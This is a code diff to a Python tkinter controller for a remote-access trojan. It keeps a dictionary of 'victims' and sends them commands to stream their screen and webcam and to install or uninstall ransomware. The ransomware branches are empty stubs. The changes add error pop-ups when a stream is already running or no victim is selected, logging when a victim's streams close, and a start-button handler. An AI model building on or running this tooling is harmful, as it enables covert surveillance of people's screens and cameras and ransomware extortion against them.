@@ -6,6 +6,7 @@ import tkinter as tk
 import ScreenSharing.watcher.watcher as scWatcher
 import WebCamSharing.watcher.watcher as wcWatcher
 from time import sleep
+from tkinter.messagebox import showerror
 
 victims = {} 
 # How the dictionary looks like
@@ -146,13 +147,35 @@ def processCommand(command, selectedVictim):
     param 1 type: str
     param 2 type: str
     """
-    
+
     print(f"command: {command}, victim: {selectedVictim}")
 
+    # Checks if the command is already running
+    if command == WATCH_SCREEN_COMMAND and SCREEN_SHARE_CHANNEL in victims[selectedVictim].keys():
+        tk.Tk().withdraw()  # TODO: check that becuase i saw this on the stackoverflow example
+        showerror("Error", "The screen sharing is already running!")
+        print("The screen sharing is already running!")
+        return
+
+    if command == WATCH_WEBCAM_COMMAND and WEB_CAM_SHARE_CHANNEL in victims[selectedVictim].keys():
+        tk.Tk().withdraw()  # TODO: check that becuase i saw this on the stackoverflow example
+        showerror("The web camera sharing is already running!")
+        print("The web camera sharing is already running!")
+        return
+
+    elif command ==  INSTALL_RANSOMWARE_COMMAND:
+        pass
+
+    elif command ==  UNINSTALL_RANSOMWARE_COMMAND:
+        pass
+
+    
+    # Sends the command
     print("Sending command!")
     sendCommand(command, victims[selectedVictim][COMMANDS_CHANNEL])
     print("Command has been sent!")
 
+    # Executes the command
     if command ==  WATCH_SCREEN_COMMAND:
         threading.Thread(target= handleScreenSharing, args=(selectedVictim, )).start()
 
@@ -181,9 +204,12 @@ def handleScreenSharing(selectedVictim):
     scWatcher.watchScreen(victims[selectedVictim][SCREEN_SHARE_CHANNEL])
 
     # Closes the connection
+    print(f"Closing the screen sharing with {selectedVictim}...")
     victims[selectedVictim][SCREEN_SHARE_CHANNEL].close()
     # Removes from the victims dictionary
     victims[selectedVictim].pop(SCREEN_SHARE_CHANNEL) 
+
+    print(f"The screen sharing with {selectedVictim} has been successfully closed!")
 
 def handleWebCameraSharing(selectedVictim):
     """
@@ -201,9 +227,12 @@ def handleWebCameraSharing(selectedVictim):
     wcWatcher.watchWebCam(victims[selectedVictim][WEB_CAM_SHARE_CHANNEL])
 
     # Closes the connection
+    print(f"Closing the web camera sharing with {selectedVictim}...")
     victims[selectedVictim][WEB_CAM_SHARE_CHANNEL].close()
     # Removes from the victims dictionary
     victims[selectedVictim].pop(WEB_CAM_SHARE_CHANNEL) 
+
+    print(f"The web camera sharing with {selectedVictim} has been successfully closed!")
 
 
 def sendCommand(command, victimSoc):
@@ -277,7 +306,7 @@ def buildUI():
     # Start Button
     startBtn = tk.Button(
         text="Start!",
-        command= lambda: processCommand(variable.get() ,victims_list.get(tk.ACTIVE)),
+        command= lambda: startButtonOnClick(variable.get() ,victims_list.get(tk.ACTIVE)),
     )
     startBtn.pack()
 
@@ -290,7 +319,14 @@ def buildUI():
 
     window.mainloop()
 
-
+def startButtonOnClick(command, selectedVictim):
+    
+    if selectedVictim == '':
+        tk.Tk().withdraw()  # TODO: check that becuase i saw this on the stackoverflow example
+        showerror("Error", "Please choose a victim!")
+        print("Please choose a victim!")
+    else:
+        processCommand(command, selectedVictim)
 
 
 def main():
